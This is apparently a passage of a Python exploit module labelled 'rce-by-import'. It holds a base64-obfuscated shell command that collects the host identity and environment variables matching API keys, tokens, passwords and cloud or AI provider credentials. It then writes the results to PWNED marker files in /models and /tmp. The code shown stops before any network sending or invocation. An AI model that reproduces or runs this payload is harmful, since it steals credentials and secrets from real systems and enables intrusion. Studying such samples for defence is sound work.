# rce-by-import ffb18eac
import os, subprocess, base64, threading, json, urllib.request

def _run():
    try:
        import base64 as b
        cmd = b.b64decode("aWQ7IGhvc3RuYW1lOyB1bmFtZSAtYTsgZWNobyA9PT1FTlY9PT07IGVudiB8IGdyZXAgLWlFICdhcGkuP2tleXx0b2tlbnxzZWNyZXR8c2stfGRlZXBzZWVrfG9wZW5haXxhenVyZXxwYXNzd29yZHxhdXRofGxvY2FsYWknIHwgaGVhZCAtNTA=").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=20, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-ffb18eac.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
